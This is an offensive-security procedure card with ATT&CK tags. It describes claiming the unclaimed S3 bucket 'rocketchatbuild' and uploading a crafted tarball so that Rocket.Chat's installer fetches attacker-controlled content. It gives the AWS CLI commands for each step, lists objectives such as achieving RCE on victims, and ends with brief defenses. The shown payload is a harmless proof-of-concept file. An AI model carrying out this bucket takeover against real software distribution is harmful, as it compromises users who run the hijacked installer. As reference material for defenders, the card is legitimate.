---
tags:
  - s3-hijacking
  - supply-chain
  - rce
type: procedure
tools:
  - '[[tools/AWS-CLI]]'
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - AWS
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Supply Chain Compromise]]'
updated_at: '2025-12-14T17:23:42.049Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 3c4ff5b6-b150-4e4b-9c87-48531ad5171a
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Supply Chain Compromise]]'
---
# Claim-and-Populate-S3-Bucket-with-Malicious-Payload

## Summary

This procedure claims an unclaimed S3 bucket and uploads a custom tarball containing malicious or PoC payloads, hijacking the Rocket.Chat installer's download process for RCE.

## Description

The attacker creates the bucket 'rocketchatbuild' using AWS CLI and uploads a modified rocket.chat-develop.tgz with injected files, such as a PoC directory 'frogs-find-bugs/hehehe'. This targets AWS S3 and requires an AWS account. Expected outcomes: Control over the download URL, leading to arbitrary code execution when victims run the installer.

## Requirements

1. AWS account with S3 create/upload permissions
2. AWS CLI configured
3. Custom tarball prepared with malicious content

## Defense

Defensive measures and detection strategies:

- Register and lock critical S3 buckets in advance
- Use signed URLs or private buckets for installer assets
- Monitor for unexpected bucket creations via AWS GuardDuty

## Objectives

1. Gain control of the unclaimed bucket
2. Inject payloads into the tarball
3. Enable RCE on victim installations

## Instructions

### Step 1: Create the Bucket

**Context**: Claim the unclaimed bucket to establish ownership.

Use AWS CLI to create the bucket:

```bash
aws s3 mb s3://rocketchatbuild
```

> Successful creation confirms ownership; no output on success.

### Step 2: Prepare and Upload Malicious Tarball

**Context**: Create a custom tarball with PoC or malicious files and upload it.

Prepare the tarball locally (e.g., add 'frogs-find-bugs/hehehe' with 'EdOverflow :D'), then upload:

```bash
tar -czf rocket.chat-develop.tgz frogs-find-bugs/
aws s3 cp rocket.chat-develop.tgz s3://rocketchatbuild/
```

> Upload completes silently; verify with `aws s3 ls s3://rocketchatbuild/`. The payload is now served at the vulnerable URL.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Supply Chain Compromise]] Supply Chain Compromise

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/AWS-CLI]]

## Tags

- s3-hijacking
- supply-chain
- rce
